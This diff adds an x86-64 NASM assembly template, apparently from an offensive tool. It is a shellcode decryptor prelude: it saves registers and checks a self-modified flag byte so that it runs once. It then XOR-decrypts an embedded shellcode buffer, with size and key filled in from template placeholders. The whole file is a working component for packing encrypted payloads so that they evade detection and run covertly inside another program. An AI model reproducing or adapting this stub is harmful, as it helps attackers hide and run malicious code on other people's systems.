@@ -1,0 +1,56 @@
+SECTION .text
+	global main	
+
+
+main:
+	push r12
+	push r13
+	push r14
+	push r15
+	push rdi
+	push rsi
+	push rbx
+	push rbp
+		
+	mov rbp, rsp
+
+	cmp BYTE [rel $+27], 0xc0
+	je rocknroll	; First thread run, so decrypt and GOOOO!
+
+	mov rsp, rbp
+	
+	pop rbp
+	pop rbx
+	pop rsi
+	pop rdi
+	pop r15
+	pop r14
+	pop r13
+	pop r12
+	ret		   
+
+	xor rax, rax
+
+	rocknroll:
+	mov BYTE [rel $-1], 0xc1
+	
+	lea r8, [rel $+43]   ; shellcode 43 bytes from this prelude)
+	mov rcx, {{.SizeOfBuffer}}	    ; number of bytes of shellcode
+	mov rdx, {{.Key}}       ; decryptor key
+    
+	encrypt_loop:
+    xor [r8], dl
+    inc r8
+    dec rcx
+    jnz encrypt_loop
+
+    mov rsp, rbp
+	
+	pop rbp
+	pop rbx
+	pop rsi
+	pop rdi
+	pop r15
+	pop r14
+	pop r13
+	pop r12
